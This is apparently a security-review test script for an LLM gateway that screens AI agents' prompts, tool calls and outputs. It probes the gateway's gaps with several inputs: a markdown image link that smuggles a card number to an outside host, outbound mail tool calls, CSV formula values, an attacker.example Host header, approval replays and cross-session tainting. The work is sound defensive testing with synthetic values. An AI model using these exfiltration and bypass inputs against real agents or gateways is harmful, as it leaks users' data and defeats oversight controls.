"""Security review checks. Run: uv run python scripts/secreview/checks.py [name ...]

Each check prints what it observed. Synthetic test values only.
"""

from __future__ import annotations

import asyncio
import json
import sys
import time

from harness import AWS, CARD, DEV, OPS, Stack, json_transport  # type: ignore[import-not-found]

CHECKS = {}


def check(fn):  # noqa: ANN001, ANN201
    CHECKS[fn.__name__] = fn
    return fn


@check
async def guard_excerpt() -> None:
    s = Stack()
    r = await s.guard({"text": f"deploy config: aws_key={AWS} card {CARD}", "direction": "input"})
    body = r.json()
    ev = [e for e in s.audit_events() if e.get("route") == "guard.check"][-1]
    print("guard text   -> action", body["action"], "| redacted_text:", body["redacted_text"])
    print("               audit excerpt:", ev["excerpt"])
    print("               raw key in audit file:", AWS in s.audit_text(), "| raw card in audit file:", CARD in s.audit_text())
    r = await s.guard({"tool_call": {"name": "mail.send", "arguments": {"to": "boss@bank.example", "body": f"card {CARD}"}}})
    ev = [e for e in s.audit_events() if e.get("route") == "guard.check"][-1]
    print("guard tool   -> action", r.json()["action"], "| audit excerpt:", ev["excerpt"])
    s.cleanup()


@check
async def tool_call_pii_in_audit() -> None:
    s = Stack()
    s.mock.script([{"tool_calls": [{"name": "mail__send", "arguments": {"to": "boss@bank.example", "subject": "case", "body": f"customer card {CARD}, e-mail jan.k@example.com"}}]}])
    r = await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "Send the case summary to my boss"}]})
    ev = s.audit_events()[-1]
    print("status", r.status_code, "action", ev["action"])
    print("audit tool_calls[0].arguments:", json.dumps(ev["tool_calls"][0]["arguments"]))
    print("raw card in audit file:", CARD in s.audit_text())
    s.cleanup()


@check
async def output_link_evidence() -> None:
    s = Stack()
    s.mock.script([{"content": f"Done. ![status](https://img.example.net/p.png?ref=jan.k%40example.com&c={CARD})"}])
    r = await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "Status?"}]})
    ev = s.audit_events()[-1]
    print("status", r.status_code, "action", ev["action"])
    for f in ev["findings"]:
        print("finding", f["id"], "| evidence:", f["evidence"])
    print("raw card in audit file:", CARD in s.audit_text())
    s.cleanup()


@check
async def tool_definition_secret_forwarded() -> None:
    s = Stack()
    body = {
        "model": "gpt-4o-mini",
        "messages": [{"role": "user", "content": "hello"}],
        "tools": [{"type": "function", "function": {"name": "kb_search", "description": f"Search. Service key {AWS}", "parameters": {"type": "object", "properties": {}}}}],
    }
    r = await s.chat(body)
    ev = s.audit_events()[-1]
    up = json.dumps(s.mock.requests[-1]) if s.mock.requests else ""
    print("status", r.status_code, "action", ev["action"], "findings", [f["id"] for f in ev["findings"]])
    print("upstream received the raw key:", AWS in up)
    s.cleanup()


@check
async def history_tool_call_secret_forwarded() -> None:
    s = Stack()
    body = {
        "model": "gpt-4o-mini",
        "messages": [
            {"role": "user", "content": "check the KB"},
            {"role": "assistant", "content": None, "tool_calls": [{"id": "c1", "type": "function", "function": {"name": "kb__search", "arguments": json.dumps({"query": f"key {AWS}"})}}]},
            {"role": "tool", "tool_call_id": "c1", "content": "no results"},
        ],
    }
    r = await s.chat(body)
    ev = s.audit_events()[-1]
    up = json.dumps(s.mock.requests[-1]) if s.mock.requests else ""
    print("status", r.status_code, "action", ev["action"], "findings", [f["id"] for f in ev["findings"]])
    print("upstream received the raw key:", AWS in up)
    s.cleanup()


@check
async def unscanned_response_fields() -> None:
    seen: list = []
    reply = {
        "id": "x", "object": "chat.completion", "created": 1, "model": "gpt-4o-mini",
        "choices": [{"index": 0, "finish_reason": "stop", "message": {"role": "assistant", "content": "Here is the summary.", "reasoning_content": f"the key is {AWS}"}}],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1},
    }
    s = Stack(transport=json_transport(reply, seen))
    r = await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "summarize"}]})
    msg = r.json()["choices"][0]["message"]
    print("status", r.status_code, "action", r.headers.get("x-bouncer-action"))
    print("reasoning_content returned to client:", msg.get("reasoning_content"))
    s.cleanup()


@check
async def legacy_function_call() -> None:
    seen: list = []
    reply = {
        "id": "x", "object": "chat.completion", "created": 1, "model": "gpt-4o-mini",
        "choices": [{"index": 0, "finish_reason": "function_call", "message": {"role": "assistant", "content": None,
                     "function_call": {"name": "mail_send", "arguments": json.dumps({"to": "someone@outside.example", "body": "report"})}}}],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1},
    }
    s = Stack(transport=json_transport(reply, seen))
    r = await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "hi"}],
                      "functions": [{"name": "mail_send", "parameters": {"type": "object"}}]})
    print("status", r.status_code, "action", r.headers.get("x-bouncer-action"), "| function_call passed:", bool(r.json()["choices"][0]["message"].get("function_call")))
    s.mock.script([{"tool_calls": [{"name": "mail__send", "arguments": {"to": "someone@outside.example", "body": "report"}}]}])
    s2 = Stack()
    s2.mock.script([{"tool_calls": [{"name": "mail__send", "arguments": {"to": "someone@outside.example", "body": "report"}}]}])
    r2 = await s2.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "hi"}]})
    print("same call as tool_calls -> status", r2.status_code, r2.headers.get("x-bouncer-action"))
    s.cleanup()
    s2.cleanup()


@check
async def approval_reuse() -> None:
    s = Stack()
    call = {"tool_calls": [{"name": "payments__create_transfer", "arguments": {"from_account": "A1", "to_iban": "X", "amount": 5000, "currency": "PLN"}}]}
    body = {"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "Pay the invoice"}]}
    s.mock.script([call])
    r = await s.chat(body)
    apr = r.json()["error"]["approval_id"]
    print("first call ->", r.status_code, r.json()["error"]["code"], apr)
    async with s.client() as c:
        d = await c.post(f"/api/approvals/{apr}", json={"decision": "approve"})
    print("approve ->", d.status_code)
    for i in range(3):
        s.mock.script([call])
        r = await s.chat(body, session=f"other{i}")
        print(f"replay {i + 1} (session other{i}) ->", r.status_code, r.headers.get("x-bouncer-action"))
    s.cleanup()


@check
async def input_approval_prefix() -> None:
    # T2 rates the tool result in the approval band (0.35..0.50), so the input is held for approval.
    s = Stack()
    s.judge.script({"injection": {"yes": 0.4, "no": 0.6}, "jailbreak": {"yes": 0.0, "no": 1.0}})
    base = "Strona dostawcy: cennik usług i warunki współpracy z bankiem. " * 6  # Polish (escalated to T2), > 300 chars

    def body(tail: str) -> dict:
        return {"model": "gpt-4o-mini", "messages": [
            {"role": "user", "content": "Summarize the vendor page"},
            {"role": "assistant", "content": None, "tool_calls": [{"id": "f1", "type": "function", "function": {"name": "web__fetch", "arguments": "{\"url\": \"https://vendor.example\"}"}}]},
            {"role": "tool", "tool_call_id": "f1", "content": base + tail}]}

    r = await s.chat(body("first ending"))
    print("first ->", r.status_code, r.headers.get("x-bouncer-action"), [f["id"] for f in s.audit_events()[-1]["findings"]])
    apr = r.json()["error"].get("approval_id")
    print("held ->", r.status_code, r.json()["error"]["code"], apr)
    async with s.client() as c:
        await c.post(f"/api/approvals/{apr}", json={"decision": "approve"})
    s.judge.script({"injection": {"yes": 0.45, "no": 0.55}, "jailbreak": {"yes": 0.0, "no": 1.0}})
    r = await s.chat(body("a different ending that was never reviewed"))
    print("different content, same first 300 chars ->", r.status_code, r.headers.get("x-bouncer-action"))
    ev = s.audit_events()[-1]
    print("  finding messages:", [f["message"][-60:] for f in ev["findings"] if f["control"] == "prompt_injection"])
    s.cleanup()


@check
async def session_cross_principal() -> None:
    s = Stack()
    victim = "ses_victim01"
    # dev-assistant (another team) uses the guard API to taint ops-copilot's session
    await s.guard({"text": "page text", "direction": "tool_result", "source": "tool_result:web.fetch", "session_id": victim}, key=DEV)
    await s.guard({"text": "customer record", "direction": "tool_result", "source": "tool_result:crm.lookup_customer", "session_id": victim}, key=DEV)
    sess = s.gw.store.session(victim)
    print("victim session taint set by another principal:", sorted(sess.taint), dict(sess.taint_sources))
    s.mock.script([{"tool_calls": [{"name": "payments__create_transfer", "arguments": {"from_account": "A1", "to_iban": "X", "amount": 10, "currency": "PLN"}}]}])
    r = await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "Pay 10 PLN"}]}, key=OPS, session=victim)
    print("victim's next side-effect call ->", r.status_code, (r.json().get("error") or {}).get("code"))
    t0 = time.time()
    for i in range(300):
        await s.guard({"text": "x", "session_id": f"rnd{i}"}, key=DEV)
    print("sessions held in memory after 300 guard calls with new session ids:", len(s.gw.store.sessions), f"({time.time() - t0:.1f}s)")
    s.cleanup()


@check
async def admin_api_access() -> None:
    s = Stack()
    async with s.client() as c:
        r = await c.get("/api/policy", headers={"Host": "attacker.example"})
        print("no admin token, Host: attacker.example -> GET /api/policy", r.status_code)
        r = await c.post("/api/playground", json={"principal": "ops-copilot", "model": "gpt-4o-mini", "prompt": "hello"})
        ev = s.audit_events()[-1]
        print("playground as ops-copilot (no key) ->", r.status_code, "| audit principal", ev["principal"], "route", ev["route"])
        r = await c.post("/api/approvals/apr_none", content=b'{"decision":"approve"}')
        print("POST without content-type parsed as JSON ->", r.status_code, r.text[:80])
    s.cleanup()
    s = Stack(admin_token="t0ken-for-review")
    async with s.client() as c:
        r1 = await c.get("/api/policy")
        r2 = await c.get("/api/policy?token=t0ken-for-review")
        r3 = await c.get("/api/policy", headers={"Authorization": f"Bearer {OPS}"})
        r4 = await c.get("/metrics")
        print("with token: none", r1.status_code, "| ?token=", r2.status_code, "| agent key", r3.status_code, "| /metrics", r4.status_code)
    s.cleanup()


@check
async def csv_formula() -> None:
    s = Stack()
    await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "=1+2 starts this message"}]}, session="=SUM(1,1)")
    async with s.client() as c:
        r = await c.get("/api/export/audit.csv")
    line = [x for x in r.text.splitlines() if "SUM" in x][0]
    print("csv row:", line[:200])
    s.cleanup()


@check
async def stream_unclosed_link() -> None:
    s = Stack()
    text = "Report ready. " + "![chart](https://img.example.net/c.png?d=" + "Q" * 40 + " and the rest of the answer follows here without closing the image."
    s.mock.script([{"content": text, "chunk_size": 5}])
    r = await s.chat({"model": "gpt-4o-mini", "stream": True, "messages": [{"role": "user", "content": "go"}]})
    got = "".join(json.loads(line[5:])["choices"][0]["delta"].get("content", "") for line in r.text.splitlines() if line.startswith("data: {") and "choices" in line and json.loads(line[5:]).get("choices"))
    print("streamed text equals upstream text:", got == text)
    s.cleanup()


@check
async def large_body() -> None:
    s = Stack()
    for kb in (64, 256, 1024):
        text = ("lorem ipsum dolor " * 60000)[: kb * 1024]
        t0 = time.perf_counter()
        r = await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": text}]}, session=f"big{kb}")
        print(f"{kb} KB user message -> {r.status_code} {(r.json().get('error') or {}).get('code')} in {time.perf_counter() - t0:.2f}s")
    s.cleanup()


@check
async def session_growth() -> None:
    s = Stack()
    t0 = time.time()
    for i in range(300):
        await s.chat({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "hi"}]}, session=f"rnd-{i}")
    print("sessions in memory after 300 chat calls with distinct X-Bouncer-Session:", len(s.gw.store.sessions), f"({time.time() - t0:.1f}s)")
    s.cleanup()


@check
async def judge_url_userinfo() -> None:
    import httpx

    from bouncer.policy.loader import PolicyError, parse_policy

    text = open("policy/bouncer.yaml").read().replace("url: http://localhost:8701", "url: http://localhost:x@judge-host.example:8701", 1)
    try:
        parse_policy(text)
        print("policy accepted; httpx would connect to:", httpx.URL("http://localhost:x@judge-host.example:8701").host)
    except PolicyError as exc:
        print("rejected:", exc.message)


async def main(names: list[str]) -> None:
    for name in names or list(CHECKS):
        print(f"\n== {name}")
        try:
            await CHECKS[name]()
        except Exception as exc:  # noqa: BLE001
            print("ERROR", type(exc).__name__, exc)


if __name__ == "__main__":
    asyncio.run(main(sys.argv[1:]))
